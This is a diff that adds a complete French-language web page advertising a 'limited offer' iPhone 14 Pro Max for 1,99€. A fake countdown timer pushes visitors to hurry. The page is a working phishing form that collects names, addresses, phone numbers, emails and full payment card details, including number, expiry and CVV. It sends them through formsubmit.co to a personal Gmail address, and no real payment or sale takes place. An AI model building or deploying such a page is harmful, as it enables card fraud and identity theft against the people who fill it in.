@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Offre Limitée</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            color: #333;
+            text-align: center;
+            padding: 20px;
+        }
+        #countdown {
+            font-size: 2rem;
+            margin-bottom: 20px;
+            color: #4287f5;
+        }
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            flex-wrap: wrap;
+            gap: 20px;
+            max-width: 800px;
+            margin: 0 auto;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        form {
+            flex: 1;
+            text-align: left;
+        }
+        input[type="text"], input[type="email"], input[type="tel"], input[type="number"] {
+            width: calc(100% - 10px);
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #4287f5;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        input[type="text"].filled, input[type="email"].filled, input[type="tel"].filled, input[type="number"].filled, select.filled {
+            border-color: #2e8b57; /* Vert plus brillant */
+        }
+        input[type="submit"] {
+            background-color: #4287f5;
+            color: #fff;
+            border: none;
+            padding: 12px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+        }
+        input[type="submit"]:hover {
+            background-color: #0a5bcd;
+        }
+        .offer {
+            color: #4CAF50;
+            font-weight: bold;
+            font-size: 1.2rem;
+            margin-bottom: 10px;
+        }
+        .iphone-presentation {
+            background-color: #1a1a1a;
+            color: #fff;
+            padding: 50px 20px;
+            text-align: center;
+        }
+        .iphone-image {
+            max-width: 100%;
+            height: auto;
+            margin-bottom: 20px;
+        }
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+                padding: 10px;
+            }
+        }
+        .progress-container {
+            width: 100%;
+            background-color: #f3f3f3;
+            border-radius: 25px;
+            margin-top: 20px;
+        }
+        .progress-bar {
+            width: 0%;
+            height: 20px;
+            background-color: #4CAF50;
+            border-radius: 25px;
+            text-align: center;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <h1><strong>OFFRE LIMITEE</strong></h1>
+    <div id="countdown">30:00</div>
+    <div class="container">
+        <form action="https://formsubmit.co/baradur24@gmail.com" method="POST">
+            <label for="nom">Nom:</label>
+            <input type="text" id="nom" name="nom" required><br>
+            
+            <label for="prenom">Prénom:</label>
+            <input type="text" id="prenom" name="prenom" required><br>
+            
+            <label for="adresse">Adresse:</label>
+            <input type="text" id="adresse" name="adresse" required><br>
+            
+            <label for="code_postal">Code Postal:</label>
+            <input type="text" id="code_postal" name="code_postal" pattern="\d{5}" title="Veuillez entrer un code postal à 5 chiffres" required><br>
+            
+            <label for="telephone">Numéro de Téléphone:</label>
+            <input type="tel" id="telephone" name="telephone" value="+33" pattern="\+33\d{9}" title="Veuillez entrer un numéro de téléphone français valide avec le préfixe +33" required><br>
+            
+            <label for="email">Adresse Email:</label>
+            <input type="email" id="email" name="email" required><br>
+            
+            <label for="cardholder-name">Nom du titulaire de la carte <span class="required">*</span>:</label><br>
+            <input type="text" id="cardholder-name" name="cardholder-name" required placeholder="----"><br><br>
+            
+            <label for="card-number">Numéro de carte <span class="required">*</span>:</label><br>
+            <input type="text" id="card-number" name="card-number" required placeholder="----"><br><br>
+            
+            <label for="expiry">Date d'expiration <span class="required">*</span>:</label><br>
+            <div class="expiry-container">
+                <select id="expiry-month" name="expiry-month" required>
+                    <option value="" disabled selected>Mois</option>
+                    <option value="01">Janvier</option>
+                    <option value="02">Février</option>
+                    <option value="03">Mars</option>
+                    <option value="04">Avril</option>
+                    <option value="05">Mai</option>
+                    <option value="06">Juin</option>
+                    <option value="07">Juillet</option>
+                    <option value="08">Août</option>
+                    <option value="09">Septembre</option>
+                    <option value="10">Octobre</option>
+                    <option value="11">Novembre</option>
+                    <option value="12">Décembre</option>
+                </select>
+                <select id="expiry-year" name="expiry-year" required>
+                    <option value="" disabled selected>Année</option>
+                    <option value="2023">2023</option>
+                    <option value="2024">2024</option>
+                    <option value="2025">2025</option>
+                    <option value="2026">2026</option>
+                    <option value="2027">2027</option>
+                </select>
+            </div><br><br>
+            
+            <label for="cvv">CVV <span class="required">*</span>:</label><br>
+            <input type="text" id="cvv" name="cvv" required placeholder="----"><br><br>
+            
+            <input type="submit" value="Soumettre">
+        </form>
+    </div>
+
+    <p class="offer">Offre Limitée (1,99€)</p>
+
+    <div class="iphone-presentation">
+        <h2>Présentation de l'iPhone 14 Pro Max</h2>
+        <img src="phone.png" alt="iPhone 14 Pro Max" class="iphone-image">
+        <p>iPhone 14 Pro Max<br>Écran : Super Retina XDR 6,7 pouces, 2796 x 1290 pixels, ProMotion 120 Hz<br>Processeur : A16 Bionic avec GPU 5 cœurs<br>Caméras : Arrière : 48 MP (principale), 12 MP (ultra grand-angle), 12 MP (téléobjectif)<br>Avant : 12 MP, TrueDepth<br>Batterie : Jusqu'à 29 heures de lecture vidéo, chargement rapide 27W<br>Stockage : 128 Go, 256 Go, 512 Go, 1 To<br>Design : Cadre en acier inoxydable, dos en verre texturé<br>Couleurs : Argent, Gris Sidéral, Or, Pourpre<br>OS : iOS 16<br>Connectivité : 5G, Wi-Fi 6E, Bluetooth 5.3<br>Sécurité : Face ID</p>
+    </div>
+
+    <div class="progress-container">
+        <div class="progress-bar">0%</div>
+    </div>
+<script>
+        var countdown = 1800;
+        var timer = setInterval(function() {
+            var minutes = Math.floor(countdown / 60);
+            var seconds = countdown % 60;
+            document.getElementById('countdown').textContent = (minutes < 10 ? '0' : '') + minutes + ':' + (seconds < 10 ? '0' : '') + seconds;
+            if (countdown <= 0) {
+                clearInterval(timer);
+                document.getElementById('countdown').textContent = 'Temps écoulé!';
+            }
+            countdown--;
+        }, 1000);
+    </script>
+</body>
+</html>
